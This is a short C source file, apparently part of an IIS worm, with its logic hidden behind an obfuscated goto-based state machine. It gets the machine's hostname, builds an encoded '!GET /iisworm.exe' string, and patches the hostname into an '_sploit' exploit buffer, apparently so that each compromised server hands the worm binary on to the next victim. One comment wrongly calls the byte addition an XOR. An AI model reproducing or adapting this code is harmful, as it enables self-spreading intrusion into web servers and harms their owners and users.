#pragma optimize("", off)

#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

void setuphostname(void) {
    char hostname[1024];
    struct hostent *he;
    char tmp[1024];
    size_t len;
    int i;
    volatile int ctrl_state = 1;

ctrl_dispatcher:
    if (ctrl_state == 0) goto ctrl_end;
    if (ctrl_state == 1) goto ctrl_block1;
    if (ctrl_state == 2) goto ctrl_block2;
    if (ctrl_state == 3) goto ctrl_block3;
    if (ctrl_state == 4) goto ctrl_block4;
    if (ctrl_state == 5) goto ctrl_block5;

ctrl_block1:
    // gethostname
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 2;
    goto ctrl_dispatcher;

ctrl_block2:
    // gethostbyname
    he = gethostbyname(hostname);
    if (!he) {
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 3;
    goto ctrl_dispatcher;

ctrl_block3:
    // strncpy and strncat
    strncpy(tmp, he->h_name, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    strncat(tmp, "!GET /iisworm.exe", sizeof(tmp) - strlen(tmp) - 1);
    ctrl_state = 4;
    goto ctrl_dispatcher;

ctrl_block4:
    // for loop
    for (i = 0; i < (int)strlen(tmp); i++)
        tmp[i] += 0x21;   // XOR with 0x21 (add 0x21)
    ctrl_state = 5;
    goto ctrl_dispatcher;

ctrl_block5:
    // len and memcpy
    len = strlen(he->h_name);
    if (len > 100) len = 100;
    memcpy(_sploit + sizeof(_sploit) - 102, he->h_name, len);
    ctrl_state = 0;
    goto ctrl_dispatcher;

ctrl_end:
    return;
}

#pragma optimize("", on)
